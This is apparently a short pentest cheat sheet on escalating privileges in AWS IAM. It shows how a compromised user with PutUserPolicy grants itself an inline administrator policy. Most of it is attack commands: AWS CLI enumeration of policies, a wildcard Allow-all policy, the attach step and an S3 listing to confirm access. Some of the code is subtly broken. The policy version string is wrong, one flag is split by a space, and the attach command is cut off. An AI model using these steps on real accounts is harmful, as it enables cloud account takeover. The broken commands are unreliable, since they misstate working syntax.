# Privilege Escalation

### Privilege escalation on AWS is based on misconfigurations, if we have more permissions than necessary, its possible to obtain higher privileges.

## Case study

### A user was compromised with the List Policy and Put User Policy permissions, an attacker could leverage this Put User privilege to add an inline administrator to itself, making it administrator of the instance.

## Exploitation

#### 1) Getting the IAM user

    aws sts get-caller-identity

#### 2) Listing policies attached to a user

    aws iam list-attached-user-policies --user-name EXAMPLE_NAME -- profile EXAMPLE_PROFILE

#### 3) Retrieving information about a specific policy

    aws iam get-policy --policy-arn POLICY_ARN

### If there are more than one version of the policy, we can also list them

    aws iam list-policy-versions --policy-arn POLICY_ARN

### Now we can finally retrieve the contents of the policy

    aws iam get-policy-version --policy-arn EXAMPLE_ARN --version-id ID_EXAMPLE

#### It's important to use the command above to chech the information about the default policy

## Escalation

### If we have the PutUserPolicy is enabled, we can add an inline administrator policy to our user.

## Administrator Policy Example:

    {
    "Version": "2021-10-17",
    "Statement" : [
    {
    "Effect":"Allow",
    "Action": [
    "*"
    ],
    "Resource":[
    "*"
    ]
        }
      ]
    }

### Attaching this policy into our user

    aws iam put-user-policy --user-name EXAMPLE_USERNAME --policy-name EXAMPLE_NAME --

### Listing inline policies of our user

    aws iam list-user-policies --user-name EXAMPLE_NAME

### Listing a restricted resource (Example S3)

    aws s3 ls --profile EXAMPLE_PROFILE
